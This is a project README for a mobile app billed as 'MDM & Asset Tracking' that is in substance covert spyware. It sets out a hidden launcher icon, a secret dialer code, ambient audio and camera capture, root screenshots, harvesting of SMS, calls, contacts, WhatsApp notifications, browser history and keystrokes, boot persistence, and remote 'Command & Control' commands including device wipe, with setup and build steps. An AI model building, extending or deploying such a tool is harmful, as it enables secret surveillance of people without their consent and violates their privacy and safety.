# MDM & Asset Tracking System

نظام متكامل لإدارة الأجهزة وتتبع الأصول (Mobile Device Management / Asset Tracking).

## Architecture Overview

```
┌────────────────────────────────────────────────────────────┐
│                MOBILE DEVICE (CLIENT)                       │
│  ┌────────────────────────────────────────────────────┐    │
│  │              C# .NET MAUI App                      │    │
│  │                                                    │    │
│  │  ┌──────────────────────────────────────────────┐  │    │
│  │  │           Foreground Service                  │  │    │
│  │  │  ┌──────────┐  ┌──────────┐  ┌────────────┐  │  │    │
│  │  │  │Permission│  │  Command │  │Background  │  │  │    │
│  │  │  │ Manager  │  │ Receiver │  │ Collector  │  │  │    │
│  │  │  └────┬─────┘  └────┬─────┘  └─────┬──────┘  │  │    │
│  │  └───────┼──────────────┼──────────────┼─────────┘  │    │
│  │          │              │              │            │    │
│  │  ┌───────▼──────────────▼──────────────▼─────────┐  │    │
│  │  │              DATA COLLECTORS                   │  │    │
│  │  │  ┌───────────┐ ┌──────────┐ ┌──────────────┐  │  │    │
│  │  │  │  GPS Loc  │ │ Call Logs│ │    SMS       │  │  │    │
│  │  │  └───────────┘ └──────────┘ └──────────────┘  │  │    │
│  │  │  ┌───────────┐ ┌──────────┐ ┌──────────────┐  │  │    │
│  │  │  │ Contacts  │ │App Usage │ │  Installed   │  │  │    │
│  │  │  │           │ │  Stats   │ │    Apps      │  │  │    │
│  │  │  └───────────┘ └──────────┘ └──────────────┘  │  │    │
│  │  │  ┌───────────┐ ┌──────────┐ ┌──────────────┐  │  │    │
│  │  │  │Ambient    │ │ Camera   │ │ Notification │  │  │    │
│  │  │  │Recording  │ │ Capture  │ │ Listener     │  │  │    │
│  │  │  └───────────┘ └──────────┘ └──────────────┘  │  │    │
│  │  │  ┌───────────┐ ┌──────────┐                    │  │    │
│  │  │  │Screenshot │ │ Browser  │                    │  │    │
│  │  │  │ (Root)    │ │ History  │                    │  │    │
│  │  │  └───────────┘ └──────────┘                    │  │    │
│  │  └──────────────────────┬─────────────────────────┘  │    │
│  │                         │                             │    │
│  │  ┌──────────────────────▼──────────────────────────┐  │    │
│  │  │         OFFLINE QUEUE (SQLite)                   │  │    │
│  │  │  10+ جداول - تخزين مؤقت - 5 محاولات إعادة        │  │    │
│  │  └──────────────────────┬──────────────────────────┘  │    │
│  │                         │                             │    │
│  │  ┌──────────────────────▼──────────────────────────┐  │    │
│  │  │         SYNC SERVICE (Supabase REST API)         │  │    │
│  │  │   بيانات مشفرة بـ AES-256-GCM ← يرفع + وسائط    │  │    │
│  │  └─────────────────────────────────────────────────┘  │    │
│  └────────────────────────────────────────────────────┘    │
│                                                            │
│  ┌────────────────────────────────────────────────────┐    │
│  │         STEALTH & ADMIN MODULES                     │    │
│  │  ┌────────────┐ ┌──────────┐ ┌─────────────────┐   │    │
│  │  │  Hide App  │ │  Device  │ │  Notification   │   │    │
│  │  │   Icon     │ │  Admin   │ │  Listener       │   │    │
│  │  └────────────┘ └──────────┘ └─────────────────┘   │    │
│  │  ┌────────────┐ ┌──────────┐ ┌─────────────────┐   │    │
│  │  │  Secret    │ │  Remote  │ │  BOOT Receiver  │   │    │
│  │  │  Code      │ │  Wipe    │ │  (Auto Restart) │   │    │
│  │  └────────────┘ └──────────┘ └─────────────────┘   │    │
│  └────────────────────────────────────────────────────┘    │
└──────────────────────┬─────────────────────────────────────┘
                       │
                       │ HTTPS + AES-256-GCM
                       │ JSON Encrypted + Media Files
                       │
┌──────────────────────▼─────────────────────────────────────┐
│              SUPABASE CLOUD (BACKEND)                        │
│                                                             │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  PostgreSQL (18 جداول)                               │    │
│  │  ┌──────────────┐ ┌────────────────┐ ┌──────────┐   │    │
│  │  │ devices      │ │ location_hst   │ │ call_logs│   │    │
│  │  │ remote_cmds  │ │ device_state   │ │ sms_msgs │   │    │
│  │  │ contacts     │ │ notif_logs     │ │ app_usage│   │    │
│  │  │ browser_hst  │ │ media_captures │ │ geo_evnts│   │    │
│  │  │ keystrokes   │ │ files_snap     │ │ enc_keys │   │    │
│  │  └──────────────┘ └────────────────┘ └──────────┘   │    │
│  │  + RLS + Functions + Triggers + Real-time           │    │
│  └─────────────────────────────────────────────────────┘    │
└────────────────────────────────────────────────────────────┘
```

## Project Structure

```
spay/
├── supabase-schema.sql              # 18 PostgreSQL tables + RLS + Functions
├── README.md
└── DeviceTracker/                   # C# .NET MAUI Client App
    ├── DeviceTracker.csproj
    ├── MauiProgram.cs               # DI registration
    ├── App.xaml / App.xaml.cs
    ├── AppShell.xaml / AppShell.xaml.cs
    ├── MainPage.xaml / .cs          # Dashboard UI
    │
    ├── Models/
    │   ├── Command/RemoteCommand.cs     # C2 command model
    │   ├── LocationRecord.cs
    │   ├── DeviceStateRecord.cs
    │   ├── InstalledAppRecord.cs
    │   ├── CallLogRecord.cs
    │   ├── SmsRecord.cs
    │   ├── ContactRecord.cs
    │   ├── NotificationLogRecord.cs
    │   ├── AppUsageRecord.cs
    │   ├── MediaCaptureRecord.cs
    │   └── SyncPayload.cs
    │
    ├── Services/
    │   ├── EncryptionService.cs         # AES-256-GCM (SecureStorage)
    │   ├── LocalDatabaseService.cs      # SQLite (10+ tables)
    │   ├── SupabaseService.cs           # REST API + Storage uploads
    │   ├── SyncService.cs               # Offline → Cloud sync
    │   ├── DeviceBackgroundService.cs   # Master collection loop
    │   ├── StealthService.cs            # Hide/unhide app icon
    │   │
    │   ├── Collectors/
    │   │   ├── CallLogCollector.cs      # CallLog ContentProvider
    │   │   ├── SmsCollector.cs          # SMS ContentProvider
    │   │   ├── ContactCollector.cs      # ContactsContract
    │   │   └── AppUsageCollector.cs     # UsageStatsManager
    │   │
    │   ├── Command/
    │   │   ├── CommandExecutor.cs       # Execute 20+ command types
    │   │   └── CommandReceiverService.cs# Poll Supabase for commands
    │   │
    │   └── Media/
    │       ├── CameraCaptureService.cs  # Camera2 API (background)
    │       ├── AudioRecorderService.cs  # MediaRecorder (ambient)
    │       └── ScreenshotService.cs     # root screencap
    │
    └── Platforms/Android/
        ├── AndroidManifest.xml          # 30+ permissions + 5 services
        ├── MainActivity.cs
        ├── MainApplication.cs
        ├── DeviceForegroundService.cs   # FG Service (Timer every 5min)
        ├── BootReceiver.cs              # Auto-restart on boot
        │
        └── Services/
            ├── AdminReceiver.cs             # Device Admin (lock/wipe)
            ├── NotificationListenerService.cs# All notifications (WhatsApp etc.)
            └── SecretCodeReceiver.cs        # Open app via *#*#1234#*#*
```

## Setup Guide

### 1. Database (Supabase)

1. Create a Supabase project
2. Open SQL Editor and run `supabase-schema.sql`
3. Enable Realtime on all tables from Supabase Dashboard → Database → Replication

### 2. Client Configuration

Set your Supabase credentials in `SupabaseService.cs`:
```csharp
private static string SupabaseUrl =>
    Preferences.Get("supabase_url", "https://YOUR_PROJECT.supabase.co");
private static string SupabaseAnonKey =>
    Preferences.Get("supabase_anon_key", "YOUR_ANON_KEY");
```

Or set them at first launch via Preferences.

### 3. Build & Run

```bash
cd DeviceTracker
dotnet restore
dotnet build -f net8.0-android
```

## Security: End-to-End Encryption

```
┌─Device──────────────────┐     ┌─Supabase──────────────┐
│                          │     │                       │
│  Location: (lat, lng)    │     │  location_history      │
│         │                │     │  ┌─────────────────┐  │
│         ▼                │     │  │ latitude:        │  │
│  AES-256-GCM Encrypt ────┼─────┼──┤ "aB3...=="       │  │
│         │                │     │  │ longitude:       │  │
│         ▼                │     │  │ "xY7...=="       │  │
│  {"encrypted_data":      │     │  └─────────────────┘  │
│   "aB3...==",            │     │                       │
│   "device_serial":"DEV-" }     │  Only the device       │
│                          │     │  can decrypt using     │
│  Key stored in           │     │  its private AES key   │
│  Android Keystore /      │     │  (not stored in DB)    │
│  iOS Keychain            │     │                       │
└──────────────────────────┘     └───────────────────────┘
```

**كيفية التشفير:**
- كل جهاز يُنشئ مفتاح AES-256-GCM عشوائي عند أول تشغيل
- المفتاح يُخزن في `SecureStorage` (Android Keystore / iOS Keychain) - آمن
- البيانات الحساسة (lat, lng, package_name, storage) تُشفر قبل الإرسال
- حتى مدير قاعدة البيانات لا يستطيع قراءة القيم المشفرة دون المفتاح الخاص بالجهاز
- التشفير يستخدم GCM mode (Galois/Counter) الذي يوفر:
  - Confidentiality (تشفير)
  - Integrity (مصادقة: لا يمكن تعديل البيانات دون كشف)
  - Authentication tag يضمن أن البيانات لم تتغير

## Background Service Stability

### Android
- **Foreground Service** (Android 8+): إشعار دائم يمنع النظام من قتل الخدمة
- **START_STICKY**: يعيد تشغيل الخدمة تلقائياً إذا أوقفها النظام
- **Boot Receiver**: يُعيد تشغيل الخدمة بعد إقلاع الجهاز
- **WakeLock**: يمنع دخول الجهاز في وضع النوم العميق أثناء جمع البيانات
- **Battery Optimization**: يطلب إ exemption من تحسينات البطارية

### iOS
- **BGTaskScheduler** (iOS 13+): مهام خلفية مجدولة
- **Significant Location Change**: تحديثات الموقع حتى في الخلفية
- **Background Fetch**: جلب دوري كل 15 دقيقة (تقريبي)

### Offline First
- **SQLite كـ Offline Queue**: جميع البيانات تُخزن محلياً أولاً
- **Auto-Sync**: عند عودة الإنترنت، يُرفع كل شيء معلق تلقائياً
- **Retry Logic**: 5 محاولات فشل كحد أقصى قبل تخطي السجل
- **Cleanup**: حذف السجلات المرفوعة الأقدم من 7 أيام

## API Endpoints (Supabase REST)

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/devices` | Register device |
| POST | `/location_history` | Push encrypted location |
| POST | `/device_state_snapshots` | Push encrypted device state |
| POST | `/installed_applications` | Push installed apps |
| POST | `/call_logs` | Push call logs |
| POST | `/sms_messages` | Push SMS messages |
| POST | `/contacts` | Push contacts |
| POST | `/notification_logs` | Push notification content |
| POST | `/app_usage_stats` | Push app usage stats |
| POST | `/browser_history` | Push browser history |
| POST | `/media_captures` | Push media captures (files + meta) |
| POST | `/device_encryption_keys` | Register encryption key |
| GET | `/remote_commands?device_serial=eq.X&status=eq.pending` | Fetch pending commands (polling) |
| PATCH | `/remote_commands?id=eq.Y` | Update command status |

All endpoints are protected by Row Level Security (RLS) so each device
can only access its own records.

### Remote Commands (Command & Control)

| Command | Description |
|---------|-------------|
| `sync_now` | Force upload all pending data |
| `capture_location` | Collect GPS location immediately |
| `capture_call_logs` | Upload call history |
| `capture_sms` | Upload SMS messages |
| `capture_contacts` | Upload contacts |
| `capture_apps` | Upload installed apps list |
| `capture_screenshot` | Take screenshot (requires root) |
| `capture_camera` | Take photo from camera |
| `record_ambient` | Record ambient audio (30s default) |
| `lock_device` | Lock device screen immediately |
| `wipe_device` | Factory reset (IRREVERSIBLE) |
| `hide_app` | Hide app icon from launcher |
| `unhide_app` | Show app icon again |
| `enable_admin` | Activate Device Admin |
| `disable_admin` | Deactivate Device Admin |
| `play_sound` | Play alarm sound at max volume |
| `send_alert` | Show alert dialog on device |
| `update_interval` | Change collection interval |
| `restart_service` | Restart the foreground service |
| `uninstall` | Uninstall the app
